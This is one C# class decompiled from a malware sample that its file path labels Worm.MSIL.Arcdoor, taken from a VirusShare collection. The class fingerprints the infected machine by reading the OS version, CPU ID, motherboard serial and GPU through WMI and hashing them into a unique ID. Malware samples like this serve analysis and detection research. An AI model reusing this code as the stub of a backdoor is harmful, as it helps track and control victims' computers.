// Decompiled with JetBrains decompiler
// Type: Stub.cSystemInfo
// Assembly: N0ise, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BA203B70-52B4-43DD-9516-EA18553D96E9
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Worm.MSIL.Arcdoor.jy-33f7fe30ef69f7612140a0cecc282d075a3c76fd40e702b8a6d9228bf79f6445.exe

using Microsoft.Win32;
using System;
using System.Management;

namespace Stub
{
  internal class cSystemInfo
  {
    public string getSystemVersion() => this.getWindowsVersionName() + " " + this.getBitVersion();

    public string getUniqueID()
    {
      string sString = (this.getCPUID() + this.getGraphicDevice() + this.getMoboSerial()).ToString();
      return cMain.FunctionClass.getMD5Hash(sString);
    }

    private string getWindowsVersionName()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem");
      string empty = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        empty = Convert.ToString(managementBaseObject["Name"]);
      try
      {
        string str = empty.Split('|')[0];
        int length = str.Split(' ')[0].Length;
        return str.Substring(length).TrimStart().TrimEnd();
      }
      catch
      {
        return "Unknown System";
      }
    }

    private string getBitVersion() => Registry.LocalMachine.OpenSubKey("Hardware\\Description\\System\\CentralProcessor\\0").GetValue("Identifier").ToString().Contains("x86") ? "(32 Bit)" : "(64 Bit)";

    private string getCPUID()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor WHERE DeviceID = 'CPU0'");
      string empty = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        empty = Convert.ToString(managementBaseObject["ProcessorId"]);
      return empty;
    }

    private string getMoboSerial()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BaseBoard");
      string empty = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        empty = Convert.ToString(managementBaseObject["SerialNumber"]);
      return empty;
    }

    public string getGraphicDevice()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
      string empty = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        empty = Convert.ToString(managementBaseObject["Description"]);
      return empty;
    }
  }
}
